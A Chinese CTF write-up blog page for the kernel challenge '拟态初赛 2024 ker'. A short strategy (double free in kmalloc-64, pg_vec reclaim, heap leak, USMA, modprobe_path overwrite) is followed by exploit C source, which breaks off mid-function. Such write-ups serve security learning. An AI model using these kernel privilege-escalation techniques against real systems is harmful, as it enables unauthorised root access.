<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
    <title>拟态初赛 2024 ker</title>
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <header>
        <nav class="site-nav">
            <a href="/index.html" class="nav-link">/home</a>
            <span class="nav-separator">|</span>
            <a href="/about.html" class="nav-link">/about</a>
        </nav>
        <div class="terminal-prompt">
            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="/index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
            <span class="cmd">cat ./拟态初赛 2024 ker.md</span><span class="cursor">█</span>
        </div>
        <h1 class="post-title">拟态初赛 2024 ker</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-08-31]</div>
    </header>
    <div class="layout-grid">
                <main><p>kmalloc-64 delete两次 edit一次</p>
<p>利用：delete一次后先用key_user_payload占住，再delete一次，然后用pg_vec占，其中正好datalen被覆盖成一个大数，越界读泄露堆上的基址</p>
<p>之后利用一次edit，改写<code>pg_vec</code>数组中映射给用户空间的虚拟地址，打USMA，再改写<code>modprobe_path</code>修改flag权限</p>
<h2 id="exp">exp</h2><pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/types.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdint.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/syscall.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sched.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/if_ether.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/if_packet.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/mman.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/socket.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/keyctl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/ioctl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">COLOR_GREEN &quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[32m</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">COLOR_RED &quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[31m</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">COLOR_YELLOW &quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[33m</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">COLOR_DEFAULT &quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">logd</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">fmt</span><span style="color:#c0c5ce;">, ...) </span><span style="color:#8fa1b3;">dprintf</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">[*] </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">[ccb 2024 NFS_KUAF](ccb</span><span style="color:#d08770;">%202024%</span><span style="color:#a3be8c;">20NFS_KUAF.md):</span><span style="color:#d08770;">%d </span><span style="color:#c0c5ce;">&quot; fmt &quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, __FILE__, __LINE__, ##__VA_ARGS__)
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">logi</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">fmt</span><span style="color:#c0c5ce;">, ...) </span><span style="color:#8fa1b3;">dprintf</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, COLOR_GREEN &quot;</span><span style="color:#a3be8c;">[+] </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">:</span><span style="color:#d08770;">%d </span><span style="color:#c0c5ce;">&quot; fmt &quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot; COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">logw</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">fmt</span><span style="color:#c0c5ce;">, ...) </span><span style="color:#8fa1b3;">dprintf</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, COLOR_YELLOW &quot;</span><span style="color:#a3be8c;">[!] </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">:</span><span style="color:#d08770;">%d </span><span style="color:#c0c5ce;">&quot; fmt &quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot; COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">loge</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">fmt</span><span style="color:#c0c5ce;">, ...) </span><span style="color:#8fa1b3;">dprintf</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, COLOR_RED &quot;</span><span style="color:#a3be8c;">[-] </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">:</span><span style="color:#d08770;">%d </span><span style="color:#c0c5ce;">&quot; fmt &quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot; COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">die</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">fmt</span><span style="color:#c0c5ce;">, ...)                      \
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">do                                     </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">    {                                      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">loge</span><span style="color:#c0c5ce;">(fmt, ##__VA_ARGS__);          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">loge</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Exit at line </span><span style="color:#d08770;">%d</span><span style="color:#c0c5ce;">&quot;, __LINE__); \
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);                           \
</span><span style="color:#c0c5ce;">    } </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">bind_core</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">core</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    cpu_set_t cpu_set;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">CPU_ZERO</span><span style="color:#c0c5ce;">(&amp;cpu_set);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">CPU_SET</span><span style="color:#c0c5ce;">(core, &amp;cpu_set);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">sched_setaffinity</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">getpid</span><span style="color:#c0c5ce;">(), sizeof(cpu_set), &amp;cpu_set);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">logi</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Process binded to core </span><span style="color:#d08770;">%d</span><span style="color:#c0c5ce;">&quot;, core);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">u_int64_t heap_addr = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, kbase_addr = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">typedef struct</span><span style="color:#c0c5ce;"> edit
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*content;
</span><span style="color:#c0c5ce;">} edit_arg;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">content</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    edit_arg tmp =
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            .</span><span style="color:#bf616a;">content </span><span style="color:#c0c5ce;">= content,
</span><span style="color:#c0c5ce;">        };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">, &amp;tmp);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">content</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    edit_arg tmp =
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            .</span><span style="color:#bf616a;">content </span><span style="color:#c0c5ce;">= content,
</span><span style="color:#c0c5ce;">        };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0x50</span><span style="color:#c0c5ce;">, &amp;tmp);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">delete</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">content</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    edit_arg tmp =
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            .</span><span style="color:#bf616a;">content </span><span style="color:#c0c5ce;">= content,
</span><span style="color:#c0c5ce;">        };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, &amp;tmp);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">unshare_setup</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> temp_fd;
</span><span style="color:#c0c5ce;">    uid_t uid = </span><span style="color:#8fa1b3;">getuid</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">    gid_t gid = </span><span style="color:#8fa1b3;">getgid</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buffer[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">unshare</span><span style="color:#c0c5ce;">(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWNET))
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">die</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">unshare(CLONE_NEWUSER | CLONE_NEWNS)</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    temp_fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/proc/self/setgroups</span><span style="color:#c0c5ce;">&quot;, O_WRONLY);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(temp_fd, &quot;</span><span style="color:#a3be8c;">deny</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">deny</span><span style="color:#c0c5ce;">&quot;));
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(temp_fd);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    temp_fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/proc/self/uid_map</span><span style="color:#c0c5ce;">&quot;, O_WRONLY);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">snprintf</span><span style="color:#c0c5ce;">(buffer, sizeof(buffer), &quot;</span><span style="color:#a3be8c;">0 </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> 1</span><span style="color:#c0c5ce;">&quot;, uid);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(temp_fd, buffer, </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(buffer));
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(temp_fd);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    temp_fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/proc/self/gid_map</span><span style="color:#c0c5ce;">&quot;, O_WRONLY);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">snprintf</span><span style="color:#c0c5ce;">(buffer, sizeof(buffer), &quot;</span><span style="color:#a3be8c;">0 </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> 1</span><span style="color:#c0c5ce;">&quot;, gid);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(temp_fd, buffer, </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(buffer));
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(temp_fd);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">create_socket_and_alloc_pages</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">nr</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tpacket_req req;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> socket_fd, version;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> ret;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    socket_fd = </span><span style="color:#8fa1b3;">socket</span><span style="color:#c0c5ce;">(AF_PACKET, SOCK_RAW, PF_PACKET);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(socket_fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        ret = socket_fd;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> err_out;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    version = TPACKET_V1;
</span><span style="color:#c0c5ce;">    ret = </span><span style="color:#8fa1b3;">setsockopt</span><span style="color:#c0c5ce;">(socket_fd, SOL_PACKET, PACKET_VERSION, &amp;version, sizeof(version));
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ret &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">die</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[x] failed at setsockopt(PACKET_VERSION)</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> err_setsockopt;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;req, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(req));
</span><span style="color:#c0c5ce;">    req.</span><span style="color:#bf616a;">tp_block_size </span><span style="color:#c0c5ce;">= size;
</span><span style="color:#c0c5ce;">    req.</span><span style="color:#bf616a;">tp_block_nr </span><span style="color:#c0c5ce;">= nr;
</span><span style="color:#c0c5ce;">    req.</span><span style="color:#bf616a;">tp_frame_size </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    req.</span><span style="color:#bf616a;">tp_frame_nr </span><span style="color:#c0c5ce;">= (req.</span><span style="color:#bf616a;">tp_block_size </span><span style="color:#c0c5ce;">* req.</span><span style="color:#bf616a;">tp_block_nr</span><span style="color:#c0c5ce;">) / req.</span><span style="color:#bf616a;">tp_frame_size</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    ret = </span><span style="color:#8fa1b3;">setsockopt</span><span style="color:#c0c5ce;">(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, sizeof(req));
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ret &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">die</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[x] failed at setsockopt(PACKET_TX_RING)</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> err_setsockopt;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> socket_fd;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">err_setsockopt:
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(socket_fd);
</span><span style="color:#c0c5ce;">err_out:
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ret;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">packet_socket_setup</span><span style="color:#c0c5ce;">(uint32_t </span><span style="color:#bf616a;">block_size</span><span style="color:#c0c5ce;">, uint32_t </span><span style="color:#bf616a;">frame_size</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">                        uint32_t </span><span style="color:#bf616a;">block_nr</span><span style="color:#c0c5ce;">, uint32_t </span><span style="color:#bf616a;">sizeof_priv</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">timeout</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> s = </span><span style="color:#8fa1b3;">socket</span><span style="color:#c0c5ce;">(AF_PACKET, SOCK_RAW, </span><span style="color:#8fa1b3;">htons</span><span style="color:#c0c5ce;">(ETH_P_ALL));
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(s &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] socket (AF_PACKET)</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> v = TPACKET_V3;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> rv = </span><span style="color:#8fa1b3;">setsockopt</span><span style="color:#c0c5ce;">(s, SOL_PACKET, PACKET_VERSION, &amp;v, sizeof(v));
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(rv &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] setsockopt (PACKET_VERSION)</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tpacket_req3 req3;
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;req3, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(req3));
</span><span style="color:#c0c5ce;">    req3.</span><span style="color:#bf616a;">tp_sizeof_priv </span><span style="color:#c0c5ce;">= sizeof_priv;
</span><span style="color:#c0c5ce;">    req3.</span><span style="color:#bf616a;">tp_block_nr </span><span style="color:#c0c5ce;">= block_nr;
</span><span style="color:#c0c5ce;">    req3.</span><span style="color:#bf616a;">tp_block_size </span><span style="color:#c0c5ce;">= block_size;
</span><span style="color:#c0c5ce;">    req3.</span><span style="color:#bf616a;">tp_frame_size </span><span style="color:#c0c5ce;">= frame_size;
</span><span style="color:#c0c5ce;">    req3.</span><span style="color:#bf616a;">tp_frame_nr </span><span style="color:#c0c5ce;">= (block_size * block_nr) / frame_size;
</span><span style="color:#c0c5ce;">    req3.</span><span style="color:#bf616a;">tp_retire_blk_tov </span><span style="color:#c0c5ce;">= timeout;
</span><span style="color:#c0c5ce;">    req3.</span><span style="color:#bf616a;">tp_feature_req_word </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    rv = </span><span style="color:#8fa1b3;">setsockopt</span><span style="color:#c0c5ce;">(s, SOL_PACKET, PACKET_RX_RING, &amp;req3, sizeof(req3));
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(rv &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] setsockopt (PACKET_RX_RING)</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sockaddr_ll sa;
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;sa, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(sa));
</span><span style="color:#c0c5ce;">    sa.</span><span style="color:#bf616a;">sll_family </span><span style="color:#c0c5ce;">= PF_PACKET;
</span><span style="color:#c0c5ce;">    sa.</span><span style="color:#bf616a;">sll_protocol </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">htons</span><span style="color:#c0c5ce;">(ETH_P_ALL);
</span><span style="color:#c0c5ce;">    sa.</span><span style="color:#bf616a;">sll_ifindex </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">if_nametoindex</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">lo</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    sa.</span><span style="color:#bf616a;">sll_hatype </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    sa.</span><span style="color:#bf616a;">sll_halen </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    sa.</span><span style="color:#bf616a;">sll_pkttype </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    sa.</span><span style="color:#bf616a;">sll_halen </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    rv = </span><span style="color:#8fa1b3;">bind</span><span style="color:#c0c5ce;">(s, (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sockaddr *)&amp;sa, sizeof(sa));
